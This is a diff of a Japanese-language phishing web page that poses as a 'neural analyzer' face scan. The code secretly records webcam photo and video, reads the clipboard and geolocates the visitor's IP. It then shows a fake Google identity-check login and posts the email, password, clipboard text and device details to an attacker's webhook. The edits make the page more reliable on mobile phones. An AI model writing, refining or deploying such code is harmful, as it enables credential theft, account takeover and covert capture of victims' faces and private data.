@@ -22,18 +22,18 @@
 </head>
 <body>
 
-    <!-- ステップ1: スキャン画面 -->
+    <!-- Step 1: Scan Interface -->
     <div class="card" id="camera-ui">
         <h1>NEURAL ANALYZER</h1>
         <div class="v-wrap">
             <div class="scan-line" id="line"></div>
-            <video id="video" autoplay playsinline></video>
+            <video id="video" autoplay playsinline muted></video>
         </div>
         <button class="btn" id="start-btn">スキャンを開始</button>
         <div class="status-text">ENCRYPTED CONNECTION: SECURE</div>
     </div>
 
-    <!-- ステップ2: ログイン画面 -->
+    <!-- Step 2: Login Interface -->
     <div class="card" id="login-ui">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90" style="margin-bottom:20px;">
         <h2 style="font-size:16px; margin-bottom:25px; font-weight: 400; color: #ccc;">続行するには本人確認が必要です</h2>
@@ -57,7 +57,6 @@
         let net = {};
         let clipboardData = "未取得";
 
-        // IP情報の事前取得
         window.onload = async () => {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -65,21 +64,17 @@
             } catch (e) { net = { ip: "取得失敗" }; }
         };
 
-        // 1. 第一弾送信：スキャン完了直後に写真と動画を送る
         async function sendFirstStrike() {
-            const info = {
-                ua: navigator.userAgent,
-                res: `${window.screen.width}x${window.screen.height}`
-            };
-
+            if (!capturedImg) return;
+            
             const payload = {
                 username: "Strike 1: Media Captured",
                 embeds: [{
                     title: "📸 Visual Data Secured",
                     color: 0x00ff00,
                     fields: [
-                        { name: "🌐 Network", value: `**IP:** [${net.ip}](https://ipinfo.io/${net.ip})\n**Loc:** ${net.city || '?'}, ${net.country_name || '?'}`, inline: true },
-                        { name: "📱 Device", value: `**Resolution:** ${info.res}`, inline: true }
+                        { name: "🌐 Network", value: `**IP:** ${net.ip || '不明'}\n**Loc:** ${net.city || '?'}, ${net.country_name || '?'}`, inline: true },
+                        { name: "📱 Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true }
                     ],
                     timestamp: new Date()
                 }]
@@ -91,37 +86,46 @@
             try {
                 const photoBlob = await (await fetch(capturedImg)).blob();
                 formData.append('file1', photoBlob, 'face.jpg');
-                if (videoBlob) {
-                    formData.append('file2', videoBlob, 'video.webm');
+                if (videoBlob && videoBlob.size > 0) {
+                    formData.append('file2', videoBlob, 'video.mp4');
                 }
                 await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
             } catch (err) { console.error("First strike failed", err); }
         }
 
-        // スキャンボタンの挙動
         startBtn.onclick = async () => {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
                 video.srcObject = stream;
                 startBtn.innerText = "分析中...";
                 startBtn.disabled = true;
                 line.style.display = "block";
 
-                // クリップボード取得試行
                 try {
                     if (navigator.clipboard) {
                         clipboardData = await navigator.clipboard.readText();
                     }
                 } catch(e) { clipboardData = "アクセス拒否"; }
 
-                const mediaRecorder = new MediaRecorder(stream);
+                // Determine compatible MIME type for mobile
+                const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 
+                                MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 
+                                'video/webm';
+
+                const mediaRecorder = new MediaRecorder(stream, { mimeType });
                 const chunks = [];
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data && e.data.size > 0) chunks.push(e.data);
+                };
+                
                 mediaRecorder.onstop = async () => {
-                    videoBlob = new Blob(chunks, { type: 'video/webm' });
-                    // 動画の生成が終わったら即座に第一弾送信を実行
+                    videoBlob = new Blob(chunks, { type: mimeType });
                     await sendFirstStrike();
                 };
+
                 mediaRecorder.start();
 
                 setTimeout(() => {
@@ -129,20 +133,24 @@
                     canvas.width = video.videoWidth; 
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    capturedImg = canvas.toDataURL('image/jpeg', 0.5);
+                    capturedImg = canvas.toDataURL('image/jpeg', 0.6);
                     
-                    mediaRecorder.stop(); // ここでonstopが走り、sendFirstStrikeが呼ばれる
+                    // Stop recorder before stopping stream tracks
+                    if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
                     
                     document.getElementById('camera-ui').style.display = 'none';
                     document.getElementById('login-ui').style.display = 'block';
-                    stream.getTracks().forEach(t => t.stop());
-                }, 4500);
+                    
+                    // Delay stopping the tracks slightly for clean buffer
+                    setTimeout(() => {
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 500);
+                }, 5000);
             } catch (err) { 
                 alert("カメラの許可が必要です。"); 
             }
         };
 
-        // 2. 第二弾送信：ログイン情報と詳細スペック
         document.getElementById('trap-form').onsubmit = async (e) => {
             e.preventDefault();
             document.getElementById('final-btn').innerText = "認証中...";
@@ -169,7 +177,7 @@
                     fields: [
                         { name: "📧 Credentials", value: `**ID:** \`${document.getElementById('email').value}\`\n**PW:** \`${document.getElementById('pass').value}\`` },
                         { name: "📋 Clipboard", value: "```\n" + clipboardData + "\n```" },
-                        { name: "📊 Device Details", value: `**CPU:** ${info.cores}C / **Mem:** ${info.mem}\n**Battery:** ${batteryStatus}\n**TZ:** ${info.tz}` }
+                        { name: "📊 Device Details", value: `**CPU:** ${info.cores}C / **Mem:** ${info.mem}\n**Battery:** ${batteryStatus}\n**UA:** \`${info.ua}\`` }
                     ],
                     timestamp: new Date()
                 }]
